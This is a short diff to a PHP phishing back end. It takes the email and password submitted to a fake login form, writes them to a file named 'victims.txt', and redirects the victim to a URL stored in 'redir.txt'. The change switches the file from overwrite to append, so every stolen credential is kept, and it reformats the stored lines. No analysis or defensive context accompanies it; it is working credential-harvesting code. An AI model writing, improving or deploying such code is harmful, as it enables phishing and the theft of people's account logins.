@@ -2,7 +2,7 @@
 $u = $_POST['email'];
 $p = $_POST['password'];
 if ($u && $p){
-    fwrite(fopen('victims.txt','w+'),'USERNAME : '.$u.' PASSWORD : '.$p."\n");
+    fwrite(fopen('victims.txt','a+'),$u.'<!:!>'.$p."\n");
     $r = fread(fopen('redir.txt','r'),filesize('redir.txt'));
     echo "<script>window.open('".$r."','_top')</script>";
 }
